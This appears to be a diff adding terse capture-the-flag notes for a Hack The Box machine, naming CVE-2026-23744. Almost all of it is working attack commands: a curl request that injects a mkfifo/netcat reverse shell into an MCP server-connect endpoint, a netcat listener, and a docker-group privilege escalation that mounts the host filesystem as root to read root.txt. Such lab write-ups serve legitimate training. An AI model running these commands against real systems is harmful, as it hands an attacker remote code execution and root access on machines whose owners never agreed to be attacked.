@@ -1,0 +1,23 @@
+CVE is CVE-2026-23744
+
+Payload is curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
+  -H "Content-Type: application/json" \
+  -d '{"serverConfig":{"command":"sh","args":["-c","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.155 4444 >/tmp/f"],"env":{}},"serverId":"rce_test"}'
+
+Revershell is nc -lnvp 4444
+
+
+privilege escalation is 
+
+ 
+
+newgrp docker
+docker ps
+docker images
+
+docker run -v /:/hostfs --rm --user root \
+  --entrypoint cat \
+  privatebin/nginx-fpm-alpine:2.0.2 \
+  /hostfs/root/root.txt
+
+
